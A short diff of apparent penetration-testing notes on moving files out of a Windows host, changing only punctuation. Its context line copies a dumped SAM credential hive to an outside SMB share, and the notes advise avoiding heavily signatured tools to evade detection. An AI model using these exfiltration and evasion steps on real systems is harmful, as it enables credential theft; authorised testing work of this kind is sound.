@@ -70,4 +70,4 @@ copy C:\Windows\Temp\sam.hive \\10.10.14.5\share\sam.hive
 
 ## Notes
 
-`certutil` and `bitsadmin` are heavily signatured — prefer PowerShell `iwr` or an SMB share on a monitored host. SMB out to the internet is usually blocked, so SMB transfer is for the internal leg; HTTP(S) is more likely to egress. Clean up anything you drop, and keep transfers inside the engagement scope. Note the file's path and hash for the report.
+`certutil` and `bitsadmin` are heavily signatured: prefer PowerShell `iwr` or an SMB share on a monitored host. SMB out to the internet is usually blocked, so SMB transfer is for the internal leg; HTTP(S) is more likely to egress. Clean up anything you drop, and keep transfers inside the engagement scope. Note the file's path and hash for the report.
